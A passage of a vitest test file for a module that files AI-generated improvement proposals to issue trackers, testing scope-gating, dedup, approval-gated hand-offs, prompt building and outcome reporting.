import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { mkdtemp, readFile, writeFile, rm } from 'fs/promises';
import { tmpdir } from 'os';
import { join } from 'path';
import { extractTaskType } from './taskLearning/store.js';
import {
  defaultLayeredIntelligenceConfig,
  getEffectiveConfig,
  isScopeAllowed,
  PROPOSAL_SCOPES,
  PORTOS_ONLY_SCOPES,
  slugMarker,
  extractSlugFromBody,
  normalizeSlug,
  isProposalDuplicate,
  isIssueWithinDedupWindow,
  cosineSimilarity,
  findSemanticDuplicate,
  issueEmbedSeed,
  checkSemanticDuplicate,
  SEMANTIC_DEDUP_THRESHOLD,
  SEMANTIC_DEDUP_MAX_CANDIDATES,
  isAppParked,
  validateReasonerResponse,
  isHandoffEligible,
  buildHandoffTask,
  HANDOFF_COMPLEXITY,
  resolveBlockOnIssue,
  filerForTracker,
  trackerSupportsPause,
  buildPrompt,
  deriveOutcome,
  computeOutcomesReport,
  computeSelfEvalSummary,
  summarizeOutcomeStats,
  readLiTaskMetrics,
  LI_TASK_TYPE,
  LI_SCHEDULED_TASK_TYPE,
  SELF_EVAL_MAX_SUPPRESSED_LISTED,
  describeSuppressedIssue,
  suppressedIssueSlug,
  rejectionReasonBySlug,
  LI_DEGRADED_SUCCESS_THRESHOLD,
  LI_DEGRADED_MIN_SAMPLE,
  PROPOSAL_OUTCOMES,
  extractPlanSlugs,
  appendProposalToPlan,
  gatherSources,
  customSourceKey,
  fetchHttpSource,
  runShellCommand,
  getTrustShellSources,
  normalizeIssueState,
  listForgeIssues,
  extractClosingComment,
  listBlockingIssues,
  fileProposalToForge,
  ensureForgeLabels,
  applyBlockingLabel,
  normalizeJiraState,
  listJiraIssues,
  listJiraBlockingIssues,
  fileProposalToJira,
  resolveJiraBlockKey,
  applyJiraBlockingLabel,
  CLOSED_SUPPRESSION_MS,
  LI_LABEL,
  LI_BLOCKING_LABEL,
  LI_JIRA_BLOCKING_LABEL,
  LI_JOB_ID,
  normalizeIssueLabels,
  extractIssuePriority,
  extractPlannedPlanItems,
  formatPlannedWork,
  gatherPlannedWork,
  plannedWorkUnavailable,
  plannedWorkJql,
  PLANNED_WORK_LABEL,
  PLANNED_WORK_MAX_ITEMS,
  PLANNED_WORK_NONE,
  PLANNED_WORK_GUIDANCE,
  PLANNED_WORK_UNAVAILABLE_PREFIX,
  hasPlannedWorkListing,
  LOW_MERGE_RATE_THRESHOLD,
  LOW_MERGE_RATE_MIN_SAMPLE
} from './layeredIntelligence.js';

describe('defaultLayeredIntelligenceConfig', () => {
  it('is off by default with the app-owned sources on', () => {
    const c = defaultLayeredIntelligenceConfig(false);
    expect(c.enabled).toBe(false);
    expect(c.sources.goals).toBe(true);
    expect(c.sources.appMetrics).toBe(true); // the app's own performance metrics
    expect(c.sources.custom).toEqual([]);
  });

  it('caps non-PortOS apps at app scopes only', () => {
    const c = defaultLayeredIntelligenceConfig(false);
    expect(c.allowedScopes).toEqual(['app-improvement', 'app-data-gap']);
    expect(c.allowedScopes).not.toContain('loop-meta');
    expect(c.allowedScopes).not.toContain('portos-self');
  });

  it('grants PortOS the meta/self scopes', () => {
    const c = defaultLayeredIntelligenceConfig(true);
    expect(c.allowedScopes).toContain('loop-meta');
    expect(c.allowedScopes).toContain('portos-self');
  });

  it('ships the Engine-A hand-off off by default', () => {
    expect(defaultLayeredIntelligenceConfig(false).handoff).toEqual({ enabled: false });
    expect(defaultLayeredIntelligenceConfig(true).handoff).toEqual({ enabled: false });
  });

  it('defaults the outcomes feedback source on for PortOS, off for managed apps', () => {
    expect(defaultLayeredIntelligenceConfig(false).sources.outcomes).toBe(false);
    expect(defaultLayeredIntelligenceConfig(true).sources.outcomes).toBe(true);
  });

  it('defaults the selfEval source on for PortOS, off for managed apps (#2700)', () => {
    expect(defaultLayeredIntelligenceConfig(false).sources.selfEval).toBe(false);
    expect(defaultLayeredIntelligenceConfig(true).sources.selfEval).toBe(true);
  });

  it('defaults cosMetrics on for PortOS, off for managed apps (it is a PortOS-side agent-perf metric)', () => {
    expect(defaultLayeredIntelligenceConfig(false).sources.cosMetrics).toBe(false);
    expect(defaultLayeredIntelligenceConfig(true).sources.cosMetrics).toBe(true);
  });

  it('defaults the appMetrics (own-performance) source on for every app', () => {
    expect(defaultLayeredIntelligenceConfig(false).sources.appMetrics).toBe(true);
    expect(defaultLayeredIntelligenceConfig(true).sources.appMetrics).toBe(true);
  });
});

describe('getEffectiveConfig', () => {
  it('returns defaults for an app with no stored config', () => {
    expect(getEffectiveConfig({ name: 'X' })).toEqual(defaultLayeredIntelligenceConfig(false));
  });

  it('merges sources one level deep (partial toggle does not wipe others)', () => {
    const c = getEffectiveConfig({ layeredIntelligence: { sources: { goals: false } } });
    expect(c.sources.goals).toBe(false);
    expect(c.sources.appMetrics).toBe(true); // untouched default preserved
    expect(c.sources.planMd).toBe(true);
  });

  it('uses PortOS scopes when isPortos is set and none stored', () => {
    const c = getEffectiveConfig({ isPortos: true });
    expect(c.allowedScopes).toContain('portos-self');
  });

  it('honors a stored allowedScopes override', () => {
    const c = getEffectiveConfig({ layeredIntelligence: { allowedScopes: ['app-improvement'] } });
    expect(c.allowedScopes).toEqual(['app-improvement']);
  });

  it('repairs a non-array custom / allowedScopes', () => {
    const c = getEffectiveConfig({ layeredIntelligence: { sources: { custom: 'bad' }, allowedScopes: 'nope' } });
    expect(c.sources.custom).toEqual([]);
    expect(Array.isArray(c.allowedScopes)).toBe(true);
  });

  it('merges handoff one level deep (partial does not wipe default enabled)', () => {
    expect(getEffectiveConfig({ layeredIntelligence: { handoff: {} } }).handoff).toEqual({ enabled: false });
    expect(getEffectiveConfig({ layeredIntelligence: { handoff: { enabled: true } } }).handoff).toEqual({ enabled: true });
    // A junk (non-object) handoff falls back to the default.
    expect(getEffectiveConfig({ layeredIntelligence: { handoff: 'nope' } }).handoff).toEqual({ enabled: false });
  });
});

describe('LI_JOB_ID', () => {
  it('is the autonomous-job id the loop sweep runs under', () => {
    expect(LI_JOB_ID).toBe('job-layered-intelligence');
  });
});

describe('isScopeAllowed (scope-gating)', () => {
  const allowedPortos = ['app-improvement', 'app-data-gap', 'loop-meta', 'portos-self'];
  const allowedApp = ['app-improvement', 'app-data-gap'];

  it('allows an in-list app scope on a normal app', () => {
    expect(isScopeAllowed({ scope: 'app-improvement', allowedScopes: allowedApp, isPortos: false })).toBe(true);
  });

  it('rejects an unrecognized scope', () => {
    expect(isScopeAllowed({ scope: 'delete-everything', allowedScopes: allowedPortos, isPortos: true })).toBe(false);
  });

  it('rejects meta/self scopes on a non-PortOS app even if allowedScopes lists them', () => {
    for (const scope of PORTOS_ONLY_SCOPES) {
      // A hand-edited config that lists loop-meta on someone else's app must still be blocked.
      expect(isScopeAllowed({ scope, allowedScopes: allowedPortos, isPortos: false })).toBe(false);
    }
  });

  it('allows meta/self scopes only on PortOS', () => {
    for (const scope of PORTOS_ONLY_SCOPES) {
      expect(isScopeAllowed({ scope, allowedScopes: allowedPortos, isPortos: true })).toBe(true);
    }
  });

  it('rejects a scope not in allowedScopes', () => {
    expect(isScopeAllowed({ scope: 'app-data-gap', allowedScopes: ['app-improvement'], isPortos: false })).toBe(false);
  });
});

describe('slug helpers', () => {
  it('round-trips a slug marker', () => {
    expect(extractSlugFromBody(`text ${slugMarker('my-slug')} more`)).toBe('my-slug');
  });

  it('extracts nothing from a body with no marker', () => {
    expect(extractSlugFromBody('no marker here')).toBe(null);
  });

  it('normalizes messy slugs', () => {
    expect(normalizeSlug('  My Cool Feature!! ')).toBe('my-cool-feature');
    expect(normalizeSlug('already-good')).toBe('already-good');
  });

  it('returns null for empty/non-string slugs', () => {
    expect(normalizeSlug('')).toBe(null);
    expect(normalizeSlug('   ')).toBe(null);
    expect(normalizeSlug(null)).toBe(null);
    expect(normalizeSlug(42)).toBe(null);
  });
});

describe('isProposalDuplicate (dedup)', () => {
  const now = Date.parse('2026-07-07T00:00:00Z');

  it('suppresses when an OPEN issue carries the same slug', () => {
    const existing = [{ slug: 'add-metrics', state: 'open' }];
    expect(isProposalDuplicate({ slug: 'add-metrics', existingIssues: existing, now })).toBe(true);
  });

  it('suppresses when a CLOSED issue is within the 30-day window', () => {
    const closedAt = new Date(now - 10 * 24 * 60 * 60 * 1000).toISOString();
    const existing = [{ slug: 'add-metrics', state: 'closed', closedAt }];
    expect(isProposalDuplicate({ slug: 'add-metrics', existingIssues: existing, now })).toBe(true);
  });

  it('ALLOWS re-file when a closed issue is older than 30 days', () => {
    const closedAt = new Date(now - (CLOSED_SUPPRESSION_MS + 24 * 60 * 60 * 1000)).toISOString();
    const existing = [{ slug: 'add-metrics', state: 'closed', closedAt }];
    expect(isProposalDuplicate({ slug: 'add-metrics', existingIssues: existing, now })).toBe(false);
  });

  it('SUPPRESSES a checked PLAN item (closed with no closedAt — #2620)', () => {
    // A `- [x]` PLAN item reads as closed with no timestamp; it stays permanently
    // within the dedup window — a completed proposal never needs re-proposal —
    // and an unchecked `- [ ]` item (state: 'open') stays suppressed too.
    const closed = [{ slug: 'add-metrics', state: 'closed' }];
    const open = [{ slug: 'add-metrics', state: 'open' }];
    expect(isProposalDuplicate({ slug: 'add-metrics', existingIssues: closed, now })).toBe(true);
    expect(isProposalDuplicate({ slug: 'add-metrics', existingIssues: open, now })).toBe(true);
  });

  it('matches slug embedded in a body marker (no parsed slug field)', () => {
    const existing = [{ body: `stuff ${slugMarker('add-metrics')}`, state: 'open' }];
    expect(isProposalDuplicate({ slug: 'add-metrics', existingIssues: existing, now })).toBe(true);
  });

  it('does not suppress a different slug', () => {
    const existing = [{ slug: 'other-thing', state: 'open' }];
    expect(isProposalDuplicate({ slug: 'add-metrics', existingIssues: existing, now })).toBe(false);
  });

  it('is a no-op for a bad slug', () => {
    expect(isProposalDuplicate({ slug: '', existingIssues: [{ slug: 'x', state: 'open' }], now })).toBe(false);
  });

  it('normalizes both sides before comparing', () => {
    const existing = [{ slug: 'Add Metrics!', state: 'open' }];
    expect(isProposalDuplicate({ slug: 'add-metrics', existingIssues: existing, now })).toBe(true);
  });
});

describe('isAppParked (pause)', () => {
  it('is parked when at least one blocking issue is open', () => {
    expect(isAppParked([{ state: 'open' }, { state: 'closed' }])).toBe(true);
  });

  it('is not parked when all blocking issues are closed', () => {
    expect(isAppParked([{ state: 'closed' }])).toBe(false);
  });

  it('is not parked with no blocking issues', () => {
    expect(isAppParked([])).toBe(false);
  });
});

describe('validateReasonerResponse', () => {
  it('keeps a valid proposal and normalizes the slug', () => {
    const r = validateReasonerResponse({
      analysis: 'a',
      proposal: { scope: 'app-improvement', slug: 'Do The Thing', title: 'Do the thing', body: 'b', value: 'v' }
    });
    expect(r.proposal.slug).toBe('do-the-thing');
    expect(r.proposal.scope).toBe('app-improvement');
    expect(r.pause).toBe(null);
  });

  it('drops a proposal with an unrecognized scope', () => {
    const r = validateReasonerResponse({ proposal: { scope: 'nuke', slug: 'x', title: 'X' } });
    expect(r.proposal).toBe(null);
  });

  it('drops a proposal missing a title', () => {
    const r = validateReasonerResponse({ proposal: { scope: 'app-improvement', slug: 'x', title: '  ' } });
    expect(r.proposal).toBe(null);
  });

  it('drops a proposal with an empty slug', () => {
    const r = validateReasonerResponse({ proposal: { scope: 'app-improvement', slug: '!!', title: 'X' } });
    expect(r.proposal).toBe(null);
  });

  it('keeps a pause with an integer issue number', () => {
    const r = validateReasonerResponse({ pause: { blockOnIssue: 42, reason: 'blocked' } });
    expect(r.pause).toEqual({ blockOnIssue: 42, reason: 'blocked' });
  });

  it('keeps pause "this" ONLY when a proposal survives', () => {
    const withProp = validateReasonerResponse({
      proposal: { scope: 'app-improvement', slug: 'x', title: 'X' },
      pause: { blockOnIssue: 'this', reason: 'block on the new one' }
    });
    expect(withProp.pause).toEqual({ blockOnIssue: 'this', reason: 'block on the new one' });
  });

  it('drops pause "this" when there is no proposal to block on', () => {
    const r = validateReasonerResponse({ proposal: null, pause: { blockOnIssue: 'this', reason: 'x' } });
    expect(r.pause).toBe(null);
  });

  it('drops a pause with no reason', () => {
    const r = validateReasonerResponse({ pause: { blockOnIssue: 42, reason: '' } });
    expect(r.pause).toBe(null);
  });

  it('coerces a numeric-string issue number', () => {
    const r = validateReasonerResponse({ pause: { blockOnIssue: '17', reason: 'x' } });
    expect(r.pause.blockOnIssue).toBe(17);
  });

  it('handles garbage input without throwing', () => {
    expect(validateReasonerResponse(null)).toEqual({ analysis: '', proposal: null, pause: null });
    expect(validateReasonerResponse('nope')).toEqual({ analysis: '', proposal: null, pause: null });
    expect(validateReasonerResponse({ proposal: [], pause: [] })).toEqual({ analysis: '', proposal: null, pause: null });
  });

  it('normalizes proposal complexity + safe (defaults: null / false)', () => {
    const bare = validateReasonerResponse({ proposal: { scope: 'app-improvement', slug: 'x', title: 'X' } });
    expect(bare.proposal.complexity).toBe(null);
    expect(bare.proposal.safe).toBe(false);

    const trivial = validateReasonerResponse({ proposal: { scope: 'app-improvement', slug: 'x', title: 'X', complexity: 'trivial', safe: true } });
    expect(trivial.proposal.complexity).toBe('trivial');
    expect(trivial.proposal.safe).toBe(true);

    // Unknown complexity → null; a non-strict-true safe → false.
    const junk = validateReasonerResponse({ proposal: { scope: 'app-improvement', slug: 'x', title: 'X', complexity: 'epic', safe: 'yes' } });
    expect(junk.proposal.complexity).toBe(null);
    expect(junk.proposal.safe).toBe(false);
  });
});

describe('isHandoffEligible', () => {
  const trivialSafe = { complexity: HANDOFF_COMPLEXITY, safe: true };
  const on = { handoff: { enabled: true } };

  it('is eligible only when enabled + filed ref + trivial + safe', () => {
    expect(isHandoffEligible({ proposal: trivialSafe, config: on, filed: 42 })).toBe(true);
    expect(isHandoffEligible({ proposal: trivialSafe, config: on, filed: 'PROJ-7' })).toBe(true);
  });

  it('is NOT eligible when hand-off is disabled', () => {
    expect(isHandoffEligible({ proposal: trivialSafe, config: { handoff: { enabled: false } }, filed: 42 })).toBe(false);
    expect(isHandoffEligible({ proposal: trivialSafe, config: {}, filed: 42 })).toBe(false);
  });

  it('is NOT eligible without a concrete filed ref (plan-tracked apps)', () => {
    expect(isHandoffEligible({ proposal: trivialSafe, config: on, filed: null })).toBe(false);
    expect(isHandoffEligible({ proposal: trivialSafe, config: on, filed: '' })).toBe(false);
    expect(isHandoffEligible({ proposal: trivialSafe, config: on, filed: false })).toBe(false);
  });

  it('is NOT eligible unless BOTH trivial AND safe', () => {
    expect(isHandoffEligible({ proposal: { complexity: 'moderate', safe: true }, config: on, filed: 1 })).toBe(false);
    expect(isHandoffEligible({ proposal: { complexity: 'trivial', safe: false }, config: on, filed: 1 })).toBe(false);
    expect(isHandoffEligible({ proposal: null, config: on, filed: 1 })).toBe(false);
  });
});

describe('buildHandoffTask', () => {
  const app = { id: 'app-1', name: 'App One' };
  const proposal = { title: 'Fix the typo', body: 'change X to Y', value: 'clarity', slug: 'fix-typo' };

  it('builds an approval-gated internal task scoped to the app', () => {
    const t = buildHandoffTask({ app, proposal, issueRef: 42 });
    expect(t.approvalRequired).toBe(true);
    expect(t.app).toBe('app-1');
    expect(t.priority).toBe('MEDIUM');
    expect(t.description).toBe('LI hand-off: Fix the typo');
  });

  it('references the filed issue in the context (# for forge number, raw key for jira)', () => {
    expect(buildHandoffTask({ app, proposal, issueRef: 42 }).context).toContain('#42');
    const jira = buildHandoffTask({ app, proposal, issueRef: 'PROJ-7' }).context;
    expect(jira).toContain('PROJ-7');
    expect(jira).toContain('change X to Y'); // carries the proposal body
  });
});

describe('resolveBlockOnIssue', () => {
  it('maps "this" to the just-filed issue number', () => {
    expect(resolveBlockOnIssue({ blockOnIssue: 'this' }, 99)).toBe(99);
  });

  it('returns null for "this" with no filed issue', () => {
    expect(resolveBlockOnIssue({ blockOnIssue: 'this' }, null)).toBe(null);
  });

  it('passes an integer through', () => {
    expect(resolveBlockOnIssue({ blockOnIssue: 7 }, null)).toBe(7);
  });

  it('returns null for a null pause', () => {
    expect(resolveBlockOnIssue(null, 5)).toBe(null);
  });
});

describe('filerForTracker / trackerSupportsPause (dispatch)', () => {
  it('routes forges to the forge filer', () => {
    expect(filerForTracker('github')).toBe('forge');
    expect(filerForTracker('gitlab')).toBe('forge');
  });

  it('routes jira to the jira filer', () => {
    expect(filerForTracker('jira')).toBe('jira');
  });

  it('routes plan (and unknowns) to the plan filer', () => {
    expect(filerForTracker('plan')).toBe('plan');
    expect(filerForTracker(undefined)).toBe('plan');
    expect(filerForTracker('weird')).toBe('plan');
  });

  it('plan does not support pause; forge/jira do', () => {
    expect(trackerSupportsPause('plan')).toBe(false);
    expect(trackerSupportsPause('github')).toBe(true);
    expect(trackerSupportsPause('jira')).toBe(true);
  });
});

describe('buildPrompt', () => {
  const app = { name: 'TestApp' };

  it('only offers meta/self scopes on PortOS', () => {
    const nonPortos = buildPrompt({
      app, isPortos: false,
      config: { allowedScopes: ['app-improvement', 'app-data-gap', 'loop-meta'], rules: '' }
    });
    expect(nonPortos).not.toContain('loop-meta'); // gated out by isScopeAllowed
    expect(nonPortos).toContain('meta/self scopes are unavailable');

    const portos = buildPrompt({
      app, isPortos: true,
      config: { allowedScopes: ['app-improvement', 'loop-meta', 'portos-self'], rules: '' }
    });
    expect(portos).toContain('loop-meta');
    expect(portos).toContain('portos-self');
  });

  it('injects operator rules and open-issue slugs', () => {
    const out = buildPrompt({
      app, isPortos: false,
      config: { allowedScopes: ['app-improvement'], rules: 'prefer perf work' },
      openIssues: [{ number: 3, slug: 'existing-thing', title: 'Existing' }],
      sources: { goals: 'ship faster' }
    });
    expect(out).toContain('prefer perf work');
    expect(out).toContain('existing-thing');
    expect(out).toContain('ship faster');
    expect(out).toContain('JSON only');
  });

  it('mentions the hand-off only when it is enabled', () => {
    const off = buildPrompt({ app, isPortos: false, config: { allowedScopes: ['app-improvement'], rules: '' } });
    expect(off).not.toContain('Hand-off:');
    const on = buildPrompt({ app, isPortos: false, config: { allowedScopes: ['app-improvement'], rules: '', handoff: { enabled: true } } });
    expect(on).toContain('Hand-off:');
    expect(on).toContain('"complexity":"trivial"');
  });

  it('injects the outcomes report + calibration guidance only when non-empty', () => {
    const base = { app, isPortos: false, config: { allowedScopes: ['app-improvement'], rules: '' } };
    const without = buildPrompt(base);
    expect(without).not.toContain('liOutcomes');
    const withReport = buildPrompt({ ...base, outcomesReport: 'Past LI proposals (last 30 days):\n- Total filed: 3' });
    expect(withReport).toContain('### liOutcomes');
    expect(withReport).toContain('Total filed: 3');
    expect(withReport).toContain('calibrate your proposal');
  });

  it('injects the selfEval block only when non-empty (#2700)', () => {
    const base = { app, isPortos: false, config: { allowedScopes: ['app-improvement'], rules: '' } };
    expect(buildPrompt(base)).not.toContain('liSelfEval');
    expect(buildPrompt({ ...base, selfEvalReport: '   ' })).not.toContain('liSelfEval');
    const withReport = buildPrompt({ ...base, selfEvalReport: 'LI self-evaluation:\n- Reasoning confidence: low' });
    expect(withReport).toContain('### liSelfEval');
    expect(withReport).toContain('Reasoning confidence: low');
    expect(withReport).toContain('Filing nothing (proposal: null) is a legitimate');
  });

  it('renders selfEval and outcomes as independent blocks (either can stand alone)', () => {
    const base = { app, isPortos: false, config: { allowedScopes: ['app-improvement'], rules: '' } };
    const selfOnly = buildPrompt({ ...base, selfEvalReport: 'self-eval body' });
    expect(selfOnly).toContain('### liSelfEval');
    expect(selfOnly).not.toContain('### liOutcomes');
    const both = buildPrompt({ ...base, outcomesReport: 'outcomes body', selfEvalReport: 'self-eval body' });
    expect(both).toContain('### liOutcomes');
    expect(both).toContain('### liSelfEval');
  });

  it('frames the mission around the app\'s own goals and performance', () => {
    const out = buildPrompt({ app, isPortos: false, config: { allowedScopes: ['app-improvement'], rules: '' } });
    expect(out).toContain('its OWN goals and purpose');
  });

  it('nudges a managed app with no own-performance metrics toward a METRICS.md data gap', () => {
    // No appMetrics source gathered → guidance to add a METRICS.md.
    const missing = buildPrompt({ app, isPortos: false, config: { allowedScopes: ['app-data-gap'], rules: '' } });
    expect(missing).toContain('METRICS.md');
    // Present appMetrics → no add-a-METRICS.md nudge.
    const present = buildPrompt({
      app, isPortos: false, config: { allowedScopes: ['app-data-gap'], rules: '' },
      sources: { appMetrics: 'Weekly active users: up' }
    });
    expect(present).not.toContain('no METRICS.md');
  });

  it('does not nudge to add a METRICS.md when the appMetrics source is deliberately off', () => {
    // Source disabled → the file may exist but wasn't gathered; nudging to "add"
    // one would be misleading. No nudge despite empty gathered sources.
    const out = buildPrompt({
      app, isPortos: false,
      config: { allowedScopes: ['app-data-gap'], rules: '', sources: { appMetrics: false } }
    });
    expect(out).not.toContain('no METRICS.md');
  });

  it('does not nudge PortOS toward a METRICS.md (it measures itself via cosMetrics)', () => {
    const out = buildPrompt({ app, isPortos: true, config: { allowedScopes: ['portos-self'], rules: '' } });
    expect(out).not.toContain('no METRICS.md');
  });
});

describe('deriveOutcome', () => {
  it('leaves an open issue unresolved', () => {
    expect(deriveOutcome({ state: 'open' })).toBeNull();
    expect(deriveOutcome({ state: 'OPEN', stateReason: 'reopened' })).toBeNull();
    expect(deriveOutcome({})).toBeNull();
  });

  it('maps closed-not-planned to rejected', () => {
    expect(deriveOutcome({ state: 'closed', stateReason: 'not_planned' })).toBe('rejected');
    expect(deriveOutcome({ state: 'closed', stateReason: 'not planned' })).toBe('rejected');
  });

  it('maps closed-completed (and reason-less closes from glab/jira/plan) to merged', () => {
    expect(deriveOutcome({ state: 'closed', stateReason: 'completed' })).toBe('merged');
    // Graceful fallback: trackers that report no stateReason keep the current
    // merged behavior — their common close path IS a merge (#2620).
    expect(deriveOutcome({ state: 'closed' })).toBe('merged');
    expect(deriveOutcome({ state: 'closed', stateReason: null })).toBe('merged');
    expect(deriveOutcome({ state: 'closed', stateReason: '' })).toBe('merged');
  });

  it('maps a close with any OTHER present reason to abandoned (#2620)', () => {
    expect(deriveOutcome({ state: 'closed', stateReason: 'duplicate' })).toBe('abandoned');
    expect(deriveOutcome({ state: 'closed', stateReason: 'stale' })).toBe('abandoned');
    expect(deriveOutcome({ state: 'closed', stateReason: 'reopened' })).toBe('abandoned');
  });
});

describe('computeOutcomesReport', () => {
  it('returns empty string when there is no filed history', () => {
    expect(computeOutcomesReport({ outcomes: [] })).toBe('');
    expect(computeOutcomesReport({})).toBe('');
  });

  it('summarizes totals, per-scope merge rates, and classified rejection reasons', () => {
    const outcomes = [
      { scope: 'app-data-gap', outcome: 'merged' },
      { scope: 'app-data-gap', outcome: 'merged' },
      { scope: 'app-improvement', outcome: 'rejected', rejectionReason: 'duplicate' },
      { scope: 'app-improvement', outcome: null }
    ];
    const report = computeOutcomesReport({ outcomes });
    expect(report).toContain('Total filed: 4');
    expect(report).toContain('Merged/implemented: 2 (50%)');
    expect(report).toContain('Rejected: 1 (25%)');
    expect(report).toContain('Still open: 1 (25%)');
    expect(report).toContain('app-data-gap: 2 filed, 2 merged (100%)');
    expect(report).toContain('app-improvement: 2 filed, 0 merged (0%)');
    // The taxonomy gloss (#2689), not the raw tracker string this used to echo.
    expect(report).toContain('Why non-merged proposals were closed: already tracked elsewhere (duplicate) (1)');
  });

  it('reports an undiagnosed rejection history as the data gap it is (#2689)', () => {
    const report = computeOutcomesReport({
      outcomes: [
        { scope: 'app-improvement', outcome: 'merged' },
        { scope: 'app-improvement', outcome: 'rejected', rejectionReason: 'unknown-reason' }
      ]
    });
    expect(report).toContain('Why non-merged proposals were closed: 1 of 1 closed with no recorded reason');
  });

  it('says nothing has been closed unmerged rather than implying no reasons exist (#2689)', () => {
    const report = computeOutcomesReport({ outcomes: [{ scope: 'app-improvement', outcome: 'merged' }] });
    expect(report).toContain('Why non-merged proposals were closed: nothing has been closed unmerged yet');
  });

  it('never claims nothing was closed unmerged while reporting rejections (#2689)', () => {
    // A resolved record that reconcile has not classified yet (a pre-taxonomy
    // install, or an issue that fell out of the tracker read) must not make the
    // report contradict its own "Rejected: 2" line two rows above.
    const report = computeOutcomesReport({
      outcomes: [
        { scope: 'app-improvement', outcome: 'rejected' },
        { scope: 'app-improvement', outcome: 'abandoned' }
      ]
    });
    expect(report).toContain('Rejected: 1 (50%)');
    expect(report).not.toContain('nothing has been closed unmerged yet');
    expect(report).toContain('Why non-merged proposals were closed: 2 of 2 not yet classified');
  });

  it('reports abandoned distinctly and excludes it from the merged numerator (#2620)', () => {
    const outcomes = [
      { scope: 'app-improvement', outcome: 'merged' },
      { scope: 'app-improvement', outcome: 'abandoned' },
      { scope: 'app-improvement', outcome: 'abandoned' },
      { scope: 'app-improvement', outcome: 'rejected', rejectionReason: 'duplicate' }
    ];
    const report = computeOutcomesReport({ outcomes });
    expect(report).toContain('Abandoned: 2 (50%)');
    expect(report).toContain('Merged/implemented: 1 (25%)');
    // Per-scope merge rate: abandoned counts in filed, never in merged.
    expect(report).toContain('app-improvement: 4 filed, 1 merged (25%)');
  });

  it('exposes the recognized outcome set', () => {
    expect(PROPOSAL_OUTCOMES).toEqual(['merged', 'rejected', 'abandoned']);
  });
});

describe('summarizeOutcomeStats', () => {
  it('reports a null merge rate (not 0) when nothing has resolved yet', () => {
    const stats = summarizeOutcomeStats([{ outcome: null }, { outcome: null }]);
    expect(stats.total).toBe(2);
    expect(stats.pending).toBe(2);
    expect(stats.resolved).toBe(0);
    // The sentinel that keeps "awaiting triage" from reading as "all rejected".
    expect(stats.rawMergeRate).toBeNull();
  });

  it('measures the merge rate over resolved proposals only, unrounded', () => {
    const stats = summarizeOutcomeStats([
      { outcome: 'merged' },
      { outcome: 'rejected' },
      { outcome: 'abandoned' },
      { outcome: null }
    ]);
    expect(stats.resolved).toBe(3);
    expect(stats.pending).toBe(1);
    expect(stats.rawMergeRate).toBeCloseTo(33.33, 1);
  });

  it('tolerates a non-array / junk input', () => {
    expect(summarizeOutcomeStats(null).total).toBe(0);
    expect(summarizeOutcomeStats([null, 'x', { outcome: 'merged' }]).total).toBe(1);
  });
});

describe('suppressedIssueSlug + rejectionReasonBySlug (#2689 feedback loop)', () => {
  it('recovers a normalized slug from a forge body marker, a bare plan row, or nothing', () => {
    expect(suppressedIssueSlug({ body: '<!-- lil-slug: Add-Telemetry -->' })).toBe('add-telemetry');
    expect(suppressedIssueSlug({ slug: 'Fix Thing' })).toBe('fix-thing');
    expect(suppressedIssueSlug({ title: 'no marker here' })).toBe(null);
    expect(suppressedIssueSlug({})).toBe(null);
  });

  it('indexes only resolved records diagnosed with a REAL taxonomy reason', () => {
    const map = rejectionReasonBySlug([
      { slug: 'a', outcome: 'rejected', rejectionReason: 'scope-mismatch' },
      { slug: 'b', outcome: 'abandoned', rejectionReason: 'unknown-reason' }, // sentinel: not an actionable pattern
      { slug: 'c', outcome: 'merged', rejectionReason: 'scope-mismatch' },    // merged: not a rejection
      { slug: 'd', outcome: 'rejected', rejectionReason: null },              // unclassified: nothing to say
      { slug: 'e', outcome: null, rejectionReason: 'duplicate' }              // unresolved
    ]);
    expect(map.get('a')).toBe('scope-mismatch');
    // The `unknown-reason` sentinel is deliberately excluded — it is the absence of a
    // diagnosis, not a failure pattern the reasoner can route around.
    expect(map.has('b')).toBe(false);
    expect(map.has('c')).toBe(false);
    expect(map.has('d')).toBe(false);
    expect(map.has('e')).toBe(false);
  });

  it('keeps the first diagnosed record per slug and tolerates non-array input', () => {
    const map = rejectionReasonBySlug([
      { slug: 'dup', outcome: 'rejected', rejectionReason: 'duplicate' },
      { slug: 'dup', outcome: 'rejected', rejectionReason: 'quality-issue' }
    ]);
    expect(map.get('dup')).toBe('duplicate');
    expect(rejectionReasonBySlug(null).size).toBe(0);
    expect(rejectionReasonBySlug(undefined).size).toBe(0);
  });

  it('describeSuppressedIssue appends the glossed reason only when the slug is diagnosed', () => {
    const reasons = new Map([['add-telemetry', 'scope-mismatch']]);
    expect(describeSuppressedIssue({ number: 12, title: 'Add telemetry', body: '<!-- lil-slug: add-telemetry -->' }, reasons))
      .toBe("#12 [add-telemetry] Add telemetry — previously closed: outside the app's scope");
    // Unmatched slug or no lookup → unchanged output (back-compat).
    expect(describeSuppressedIssue({ slug: 'other' }, reasons)).toBe('[other]');
    expect(describeSuppressedIssue({ slug: 'add-telemetry' })).toBe('[add-telemetry]');
  });
});

describe('computeSelfEvalSummary (#2700)', () => {
  const liMetrics = (over = {}) => ({
    read: true,
    metrics: { completed: 10, succeeded: 8, failed: 2, successRate: 80, recentOutcomes: [], ...over }
  });

  it('reports every signal as explicitly unavailable — and low confidence — with no data', () => {
    const report = computeSelfEvalSummary();
    expect(report).toContain('Reasoning confidence: low (0 of 3 self-signals available)');
    expect(report).toContain('Proposal merge rate: UNAVAILABLE');
    expect(report).toContain('Your already-filed proposals: UNKNOWN');
    expect(report).toContain('LI execution health: UNAVAILABLE');
    expect(report).toContain('GUIDANCE — low self-confidence');
    // A blind run must never be told it has a 0% rate.
    expect(report).not.toContain('(0%)');
  });

  it('distinguishes "outcomes not gathered" from "gathered, none filed"', () => {
    expect(computeSelfEvalSummary({ outcomes: null })).toContain('Proposal merge rate: UNAVAILABLE');
    expect(computeSelfEvalSummary({ outcomes: [] })).toContain('no proposals filed yet for this app');
  });

  it('does not read filed-but-unresolved proposals as a 0% merge rate', () => {
    const report = computeSelfEvalSummary({ outcomes: [{ outcome: null }, { outcome: null }] });
    expect(report).toContain('2 filed, none resolved yet — rate unknown');
    expect(report).toContain('Awaiting triage is NOT rejection');
    expect(report).not.toContain('0%');
  });

  it('reports a real merge rate with its classified rejection reasons', () => {
    const outcomes = [
      { outcome: 'merged' },
      { outcome: 'rejected', rejectionReason: 'user-rejected' },
      { outcome: 'rejected', rejectionReason: 'user-rejected' },
      { outcome: 'abandoned', rejectionReason: 'duplicate' }
    ];
    const report = computeSelfEvalSummary({ outcomes });
    expect(report).toContain('1 of 4 resolved proposals merged (25%)');
